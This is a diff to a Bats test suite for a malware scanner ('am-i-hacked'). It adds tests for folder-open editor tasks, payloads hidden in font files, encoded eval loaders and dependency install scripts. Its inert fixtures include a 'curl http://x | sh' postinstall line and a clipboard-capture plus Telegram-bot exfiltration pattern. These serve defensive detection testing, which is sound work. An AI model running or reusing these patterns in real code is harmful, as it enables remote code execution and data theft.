@@ -35,6 +35,10 @@ scan() {
   run bash "$SCRIPT" "$TMP"
 }
 
+scan_trusted() {
+  run bash "$SCRIPT" "$TMP" --trusted
+}
+
 count_in_output() {
   printf '%s\n' "$output" | grep -cF -- "$1" || true
 }
@@ -47,9 +51,200 @@ write_file() {
   printf '%s\n' "$@" >"$TMP/$rel"
 }
 
+# Synthetic inputs for editor settings and asset-content checks.
+# Fixture contents are read as data, never executed.
+@test "regression: CRLF folder-open task and woff2 payload are both reported" {
+  write_file ".vscode/tasks.json" \
+    '{"tasks":[{"label":"sample-task","type":"shell","command":"node ./public/fonts/sample.woff2","presentation":{"reveal":"never","echo":false},"runOptions":{"runOn":"folderOpen"}}]}'
+  printf '{"task.allowAutomaticTasks":true}\r\n' >"$TMP/.vscode/settings.json"
+  write_file "public/fonts/sample.woff2" 'const _0x123abc = "inert regression marker";'
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Editor auto-run task"
+  assert_output --partial "Payload hidden in an asset file"
+  assert_output --partial ".vscode/settings.json:1"
+  assert_output --partial "public/fonts/sample.woff2:1"
+}
+
+@test "regression: renamed eot payload with NUL padding is reported without an editor task" {
+  mkdir -p "$TMP/public/fonts"
+  printf '/*\000 inert padding */\nconst _0x456def = "inert regression marker";\n' >"$TMP/public/fonts/renamed.eot"
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Payload hidden in an asset file"
+  assert_output --partial "public/fonts/renamed.eot:2"
+}
+
+@test "regression control: font-like bytes and manual documentation tasks pass" {
+  mkdir -p "$TMP/public/fonts"
+  printf 'wOF2\000\001\000\000' >"$TMP/public/fonts/font.woff2"
+  write_file ".vscode/tasks.json" '{"tasks":[{"label":"docs","type":"shell","command":"echo docs"}]}'
+  scan
+  assert_success
+}
+
 # -------------------------------------------------------------------------------
 # CLI contract
 # -------------------------------------------------------------------------------
+
+@test "loader coverage: encoded execution is found across source entrypoints" {
+  local path
+  for path in auth/routes/sample.js server.js next.config.ts postcss.config.js tailwind.config.ts scripts/check-runtime.js; do
+    write_file "$path" 'eval("marker;" + atob("e30="));'
+  done
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Encoded source execution"
+  for path in auth/routes/sample.js server.js next.config.ts postcss.config.js tailwind.config.ts scripts/check-runtime.js; do
+    assert_output --partial "$path:1"
+  done
+}
+
+@test "loader coverage: computed runtime module bridges are reported" {
+  write_file "server.js" 'global[lookupKey] = require;' 'globalThis[otherKey] = module;'
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Runtime module bridge"
+}
+
+@test "loader coverage: alternate string-table declarations are reported" {
+  write_file "postcss.config.js" 'var _$_cafe = ["synthetic"];'
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Obfuscated loader declaration"
+}
+
+@test "loader coverage: remote response text executed across lines is correlated" {
+  write_file "next.config.ts" \
+    'async function configure(response) {' \
+    '  const $source: string =' \
+    '    await response.text();' \
+    '  eval($source);' \
+    '}'
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Remote response executed as code"
+}
+
+@test "loader coverage: unrelated text response does not acquire remote-execution tag" {
+  write_file "server.js" \
+    'const responseText = await response.text();' \
+    'const localScript = "1";' \
+    'eval(localScript);'
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Dynamic code execution"
+  refute_output --partial "Remote response executed as code"
+}
+
+@test "loader coverage: inline response text execution is reported" {
+  write_file "server.js" 'eval(await response.text());'
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Inline remote response execution"
+}
+
+@test "loader coverage: ordinary config, local require and JSON fetch pass" {
+  write_file "postcss.config.js" 'export default { plugins: { tailwindcss: {}, autoprefixer: {} } };'
+  write_file "server.js" 'const localRequire = createRequire(import.meta.url);' 'const value = await response.json();' 'module.exports = value;'
+  scan
+  assert_success
+}
+
+@test "loader coverage: bundle markers cannot hide encoded source execution" {
+  write_file "dist/main.js" 'const __webpack_require__ = () => {}; eval(atob("e30="));'
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Encoded source execution"
+}
+
+@test "default scan: input comments cannot suppress findings" {
+  write_file "server.js" 'eval("1"); // am-i-hacked-ignore: reviewed'
+  run bash "$SCRIPT" "$TMP"
+  assert_equal "$status" 1
+  assert_output --partial "Dynamic code execution"
+  refute_output --partial "suppressed by inline comment"
+}
+
+@test "default scan: ignores cannot conceal source, dependencies or fixtures" {
+  git init -q "$TMP"
+  write_file ".gitignore" '*.js' 'node_modules/' '__security_gate_fixtures__/'
+  write_file ".ignore" '*'
+  write_file ".rgignore" '*'
+  write_file "hidden.js" 'eval("1");'
+  write_file "node_modules/sample/index.js" 'eval("1");'
+  write_file "__security_gate_fixtures__/sample.js" 'eval("1");'
+  write_file ".git/metadata.js" 'eval("1");'
+  run bash "$SCRIPT" "$TMP"
+  assert_equal "$status" 1
+  assert_output --partial "hidden.js:1"
+  assert_output --partial "node_modules/sample/index.js:1"
+  assert_output --partial "__security_gate_fixtures__/sample.js:1"
+  refute_output --partial ".git/metadata.js"
+}
+
+@test "default scan: bundle markers cannot waive routine execution signals" {
+  write_file "dist/main.js" 'const __webpack_require__ = () => {}; eval("1");'
+  run bash "$SCRIPT" "$TMP"
+  assert_equal "$status" 1
+  assert_output --partial "Dynamic code execution"
+  refute_output --partial "build output, routine matches"
+}
+
+@test "default scan: dependency escape sequences are findings instead of summaries" {
+  write_file "node_modules/sample/index.js" 'const value = "\x41\x42\x43\x44";'
+  run bash "$SCRIPT" "$TMP"
+  assert_equal "$status" 1
+  assert_output --partial "Hex or Unicode string escapes"
+  refute_output --partial "summarized, not listed individually"
+}
+
+@test "default scan: dependency package scripts are inspected" {
+  write_file "node_modules/sample/package.json" '{"scripts":{"postinstall":"node -e \"console.log(1)\""}}'
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "node_modules/sample/package.json:postinstall"
+  assert_output --partial "suspicious package script"
+}
+
+@test "default scan: tracked environment files in fixture directories are reported" {
+  git init -q "$TMP"
+  write_file "__security_gate_fixtures__/.env" 'SAMPLE_KEY=placeholder'
+  git -C "$TMP" add -f __security_gate_fixtures__/.env
+  scan
+  assert_equal "$status" 1
+  assert_output --partial "Tracked .env file"
+}
+
+@test "installed entrypoint: relative npm bin symlink finds sibling resources" {
+  local install="$BATS_TEST_TMPDIR/install with spaces"
+  mkdir -p "$install/node_modules/am-i-hacked" "$install/node_modules/.bin"
+  cp -R "$BATS_TEST_DIRNAME/../bin" "$install/node_modules/am-i-hacked/bin"
+  ln -s ../am-i-hacked/bin/scanner.sh "$install/node_modules/.bin/am-i-hacked"
+  write_file "index.js" 'console.log("hello")'
+
+  run "$install/node_modules/.bin/am-i-hacked" "$TMP"
+  assert_success
+  assert_output --partial "am-i-hacked: PASSED"
+  refute_output --partial "checksum table not found"
+}
+
+@test "installed entrypoint: chained symlinks preserve finding exit status" {
+  ln -s "$SCRIPT" "$BATS_TEST_TMPDIR/real-entry"
+  ln -s real-entry "$BATS_TEST_TMPDIR/entry"
+  write_file "index.js" 'eval("1")'
+
+  run "$BATS_TEST_TMPDIR/entry" "$TMP"
+  assert_equal "$status" 1
+  assert_output --partial "Dynamic code execution"
+}
+
+@test "installed entrypoint: symlink forwards host arguments" {
+  ln -s "$SCRIPT" "$BATS_TEST_TMPDIR/entry"
+  run "$BATS_TEST_TMPDIR/entry" host --help
+  assert_success
+  assert_output --partial "usage: am-i-hacked host"
+}
 
 @test "clean repo passes with exit 0 and a PASSED line" {
   write_file "index.js" 'console.log("hello")' 'module.exports = 1'
@@ -611,9 +806,9 @@ write_file() {
 # Scope controls
 # -------------------------------------------------------------------------------
 
-@test "node_modules is never scanned" {
+@test "trusted mode: node_modules is never scanned" {
   write_file "node_modules/evil/index.js" 'eval(atob("bad"))'
-  scan
+  scan_trusted
   assert_success
 }
 
@@ -623,14 +818,14 @@ write_file() {
   assert_success
 }
 
-@test "untracked build output that .gitignore lists is not scanned" {
+@test "trusted mode: untracked build output that .gitignore lists is not scanned" {
   git init -q "$TMP"
   write_file ".gitignore" 'dist/' 'build/' 'out/' 'coverage/' '.next/' '.turbo/' '.cache/'
   git -C "$TMP" add .gitignore
   for d in dist build out coverage .next .turbo .cache; do
     write_file "$d/evil.js" 'eval(atob("bad"))'
   done
-  scan
+  scan_trusted
   assert_success
 }
 
@@ -647,13 +842,13 @@ write_file() {
   assert_output --partial "build/setup.js:1"
 }
 
-@test "fixtures dir is excluded by default" {
+@test "trusted mode: fixtures dir is excluded" {
   write_file "__security_gate_fixtures__/evil.js" 'eval(atob("bad"))'
-  scan
+  scan_trusted
   assert_success
 }
 
-@test "fixtures dir is scanned when INCLUDE_FIXTURES=1" {
+@test "trusted mode: fixtures dir is scanned when INCLUDE_FIXTURES=1" {
   write_file "__security_gate_fixtures__/evil.js" 'eval(atob("bad"))'
   INCLUDE_FIXTURES=1 run bash "$SCRIPT" "$TMP"
   assert_failure
@@ -717,31 +912,31 @@ write_file() {
   assert_output --partial "sync-agent:2"
 }
 
-@test "untracked files that git ignores are not scanned" {
+@test "trusted mode: untracked files that git ignores are not scanned" {
   git init -q "$TMP"
   write_file ".gitignore" 'generated/' '.venv/'
   git -C "$TMP" add .gitignore
   write_file "generated/bundle.js" 'eval(atob("bad"))'
   write_file ".venv/lib/site.py" 'eval(atob("bad"))'
   write_file "src/index.js" 'console.log("hello")'
-  scan
+  scan_trusted
   assert_success
 }
 
-@test "a tracked payload beside untracked ignored files is still scanned" {
+@test "trusted mode: a tracked payload beside untracked ignored files is still scanned" {
   git init -q "$TMP"
   write_file ".gitignore" 'generated/'
   write_file "generated/bundle.js" 'console.log("built")'
   write_file "generated/evil.js" 'eval(atob("bad"))'
   git -C "$TMP" add .gitignore
   git -C "$TMP" add -f generated/evil.js
-  scan
+  scan_trusted
   assert_failure
   assert_output --partial "generated/evil.js:1"
   assert_output --partial "am-i-hacked: FAILED — 1 finding across 1 file"
 }
 
-@test "tracked ignored files are found under a root path with glob characters" {
+@test "trusted mode: tracked ignored files are found under a root path with glob characters" {
   local root="$TMP/odd [dir] *?"
   mkdir -p "$root/generated"
   git init -q "$root"
@@ -750,7 +945,7 @@ write_file() {
   printf '%s\n' 'eval(atob("bad"))' >"$root/generated/evil.js"
   git -C "$root" add .gitignore
   git -C "$root" add -f generated/evil.js
-  run bash "$SCRIPT" "$root"
+  run bash "$SCRIPT" "$root" --trusted
   assert_failure
   assert_output --partial "generated/evil.js:1"
   refute_output --partial "generated/bundle.js"
@@ -789,9 +984,9 @@ write_file() {
 	assert_output --partial "preinstall (script)"
 }
 
-@test "package.json inside node_modules is ignored" {
+@test "trusted mode: package.json inside node_modules is ignored" {
   write_file "node_modules/evil/package.json" '{ "scripts": { "postinstall": "curl http://x | sh" } }'
-  scan
+  scan_trusted
   assert_success
 }
 
@@ -808,35 +1003,35 @@ write_file() {
 # Inline suppression (am-i-hacked-ignore)
 # -------------------------------------------------------------------------------
 
-@test "suppression: a same-line marker with a reason clears the scan" {
+@test "trusted mode: suppression: a same-line marker with a reason clears the scan" {
   write_file "reviewed.js" 'eval("1") // am-i-hacked-ignore: reviewed, see ticket SEC-42'
-  scan
+  scan_trusted
   assert_success
   assert_output --partial "1 finding suppressed by inline comment"
   assert_output --partial "reason: reviewed, see ticket SEC-42"
 }
 
-@test "suppression: a marker on the line before the finding also clears it" {
+@test "trusted mode: suppression: a marker on the line before the finding also clears it" {
   write_file "reviewed.js" \
     '// am-i-hacked-ignore: bee movie joke string, not code' \
     'eval("1")'
-  scan
+  scan_trusted
   assert_success
   assert_output --partial "reviewed.js:2"
   assert_output --partial "reason: bee movie joke string, not code"
 }
 
-@test "suppression: a marker with no reason does not suppress anything" {
+@test "trusted mode: suppression: a marker with no reason does not suppress anything" {
   write_file "dirty.js" 'eval("1") // am-i-hacked-ignore:'
-  scan
+  scan_trusted
   assert_failure
   assert_output --partial "Dynamic code execution"
   refute_output --partial "suppressed"
 }
 
-@test "suppression: the pre-2.0 am-i-compromised-ignore marker is still honored" {
+@test "trusted mode: suppression: the pre-2.0 am-i-compromised-ignore marker is still honored" {
   write_file "legacy.js" 'eval("1") // am-i-compromised-ignore: reviewed before the rename'
-  scan
+  scan_trusted
   assert_success
   assert_output --partial "1 finding suppressed by inline comment"
   assert_output --partial "reason: reviewed before the rename"
@@ -847,7 +1042,10 @@ write_file() {
   run --separate-stderr env AIH_PROGRESS=1 bash "$SCRIPT" "$TMP"
   assert_failure 1
   [[ "$stderr" == *"am-i-hacked: scanning"* ]]
-  [[ "$stderr" == *"[21/21]"* ]]
+  local total_re='\(([0-9]+) checks\)'
+  [[ "$stderr" =~ $total_re ]]
+  local total="${BASH_REMATCH[1]}"
+  [[ "$stderr" == *"[$total/$total]"* ]]
   [[ "$stderr" == *"1 found"* ]]
   [[ "$output" != *"found so far"* ]]
 }
@@ -859,17 +1057,17 @@ write_file() {
   [[ "$stderr" != *"found so far"* ]]
 }
 
-@test "suppression: is honored in non-JS comment syntax" {
+@test "trusted mode: suppression: is honored in non-JS comment syntax" {
   write_file "reviewed.py" 'eval("1")  # am-i-hacked-ignore: sandboxed constant, reviewed'
-  scan
+  scan_trusted
   assert_success
   assert_output --partial "reason: sandboxed constant, reviewed"
 }
 
-@test "suppression: suppressed findings are counted separately and do not hide real ones" {
+@test "trusted mode: suppression: suppressed findings are counted separately and do not hide real ones" {
   write_file "reviewed.js" 'eval("1") // am-i-hacked-ignore: reviewed, see ticket SEC-42'
   write_file "dirty.js" 'eval("2")'
-  scan
+  scan_trusted
   assert_failure
   # only dirty.js counts toward the gate; reviewed.js is suppressed, not silent
   assert_output --partial "am-i-hacked: FAILED — 1 finding across 1 file"
@@ -879,12 +1077,12 @@ write_file() {
   assert_output --partial "reason: reviewed, see ticket SEC-42"
 }
 
-@test "suppression: a marker only suppresses its own line, not a different finding two lines away" {
+@test "trusted mode: suppression: a marker only suppresses its own line, not a different finding two lines away" {
   write_file "mixed.js" \
     'eval("1") // am-i-hacked-ignore: reviewed' \
     'ok()' \
     'eval("3")'
-  scan
+  scan_trusted
   assert_failure
   assert_output --partial "am-i-hacked: FAILED — 1 finding across 1 file"
   assert_output --partial "mixed.js:3"
@@ -1051,7 +1249,7 @@ FAKE_TELEGRAM_TOKEN="123456789:$(printf '%035d' 0 | tr 0 A)"
 # Build-output detection (webpack/esbuild/ncc bundles)
 # -------------------------------------------------------------------------------
 
-@test "build-output with only low-signal patterns is reported but passes" {
+@test "trusted mode: build-output with only low-signal patterns is reported but passes" {
   write_file "dist/index.js" \
     '/******/ (() => { // webpackBootstrap' \
     '/******/ var __webpack_modules__ = {' \
@@ -1062,54 +1260,54 @@ FAKE_TELEGRAM_TOKEN="123456789:$(printf '%035d' 0 | tr 0 A)"
     'const spawn = require("child_process").spawn;' \
     'const https = require("https");' \
     'global.x = {};'
-  scan
+  scan_trusted
   assert_success
   assert_output --partial "build output, routine matches in bundled code not counted:"
   assert_output --partial "dist/index.js:"
   assert_output --partial "matches"
 }
 
-@test "build-output with high-signal pattern fails and is listed as a finding" {
+@test "trusted mode: build-output with high-signal pattern fails and is listed as a finding" {
   write_file "dist/index.js" \
     '/******/ (() => { // webpackBootstrap' \
     '/******/ var __webpack_modules__ = {' \
     '/******/ };' \
     "const token = \"${FAKE_TELEGRAM_TOKEN}\";" \
     'fetch("https://api.telegram.org/bot" + token + "/sendMessage", {method:"POST"})'
-  scan
+  scan_trusted
   assert_failure
   assert_output --partial "Telegram bot token literal"
   refute_output --partial "build output, routine matches"
 }
 
-@test "build-output: a marker after byte 4096 is scanned normally" {
+@test "trusted mode: build-output: a marker after byte 4096 is scanned normally" {
   local big="$(printf 'A%.0s' {1..4100})"
   write_file "dist/index.js" \
     "var x = \"${big}\";" \
     'const __webpack_require__ = function() { eval("x"); };'
-  scan
+  scan_trusted
   assert_failure
   assert_output --partial "Dynamic code execution"
   assert_output --partial "source line exceeds 4000 characters"
 }
 
-@test "build-output: eval in a bundle is tracked but not flagged" {
+@test "trusted mode: build-output: eval in a bundle is tracked but not flagged" {
   write_file "dist/bundle.js" \
     '/******/ (() => {' \
     'const __nccwpck_require__ = () => {};' \
     'const __toESM = () => { eval("x"); };'
-  scan
+  scan_trusted
   assert_success
   assert_output --partial "build output, routine matches in bundled code not counted:"
   assert_output --partial "dist/bundle.js:"
   assert_output --partial "am-i-hacked: PASSED"
 }
 
-@test "no false positive: a capture + exfil combo under node_modules is not flagged" {
+@test "trusted mode: no false positive: a capture + exfil combo under node_modules is not flagged" {
   write_file "node_modules/evil/clip.js" \
     'const c = require("clipboardy")' \
     "fetch(\"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage\")"
-  scan
+  scan_trusted
   assert_success
 }
 
@@ -1119,11 +1317,11 @@ FAKE_TELEGRAM_TOKEN="123456789:$(printf '%035d' 0 | tr 0 A)"
   assert_success
 }
 
-@test "suppression: an inline marker clears a capture-and-exfil finding" {
+@test "trusted mode: suppression: an inline marker clears a capture-and-exfil finding" {
   write_file "reviewed.js" \
     'const clipboardy = require("clipboardy") // am-i-hacked-ignore: reviewed local clipboard helper' \
     "fetch(\"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage\")"
-  scan
+  scan_trusted
   assert_success
   assert_output --partial "1 finding suppressed by inline comment"
   assert_output --partial "reason: reviewed local clipboard helper"
@@ -1236,21 +1434,21 @@ sha256_of() {
   assert_output --partial "source line exceeds 4000 characters"
 }
 
-@test "node-modules repo: a plain Yarn setup with an untracked node_modules passes" {
+@test "trusted mode: node-modules repo: a plain Yarn setup with an untracked node_modules passes" {
   write_file ".yarnrc.yml" 'nodeLinker: node-modules'
   write_file "package.json" '{ "scripts": { "build": "tsc", "test": "vitest run" } }'
   write_file "node_modules/evil/index.js" 'eval(atob("x"))'
-  scan
+  scan_trusted
   assert_success
 }
 
-@test "husky v9 repo: a tracked hook beside an untracked ignored .husky/_ passes" {
+@test "trusted mode: husky v9 repo: a tracked hook beside an untracked ignored .husky/_ passes" {
   git init -q "$TMP"
   write_file ".gitignore" '.husky/_/'
   write_file ".husky/pre-commit" 'pnpm exec lint-staged'
   write_file ".husky/_/husky.sh" 'eval(atob("x"))'
   git -C "$TMP" add .gitignore
-  scan
+  scan_trusted
   assert_success
 }
 
@@ -1278,7 +1476,7 @@ sha256_of() {
   assert_success
 }
 
-@test "python repo: a plain noxfile passes while an untracked ignored venv is skipped" {
+@test "trusted mode: python repo: a plain noxfile passes while an untracked ignored venv is skipped" {
   git init -q "$TMP"
   write_file ".gitignore" '.venv/'
   write_file "pyproject.toml" '[project]' 'name = "example"' 'version = "0.1.0"'
@@ -1290,17 +1488,17 @@ sha256_of() {
     '    session.run("pytest", "-q")'
   write_file ".venv/lib/site.py" 'eval(atob("x"))'
   git -C "$TMP" add .gitignore pyproject.toml noxfile.py
-  scan
+  scan_trusted
   assert_success
 }
 
-@test "next.js repo: untracked ignored build output is skipped" {
+@test "trusted mode: next.js repo: untracked ignored build output is skipped" {
   git init -q "$TMP"
   write_file ".gitignore" '.next/'
   big="$(printf 'A%.0s' {1..5000})"
   write_file ".next/server/app.js" "var x = \"${big}\";"
   git -C "$TMP" add .gitignore
-  scan
+  scan_trusted
   assert_success
 }
 
@@ -1423,21 +1621,21 @@ sha256_of() {
   refute_output --partial "in dependency libraries"
 }
 
-@test "hex escapes in a dependency dir are summarized, not listed per hit" {
+@test "trusted mode: hex escapes in a dependency dir are summarized, not listed per hit" {
   write_file "app/.venv/lib/python3.11/site-packages/pkg/mod.js" \
     'var s = "\x68\x65\x6c\x6c\x6f\x77\x6f\x72\x6c\x64\x21"'
   write_file "app/index.js" 'console.log("ok")'
-  scan
+  scan_trusted
   assert_success
   assert_output --partial "Hex or Unicode string escapes in dependency libraries"
   assert_output --partial "1 matches"
   refute_output --partial "site-packages/pkg/mod.js:1"
 }
 
-@test "dependency hex summaries do not hide a real finding" {
+@test "trusted mode: dependency hex summaries do not hide a real finding" {
   write_file ".venv/lib/site-packages/pkg/a.js" 'var s = "\x68\x65\x6c\x6c\x6f\x77\x6f\x72\x6c\x64"'
   write_file "evil.js" 'eval(atob("bad"))'
-  scan
+  scan_trusted
   assert_failure
   assert_output --partial "evil.js:1"
   assert_output --partial "Hex or Unicode string escapes in dependency libraries"
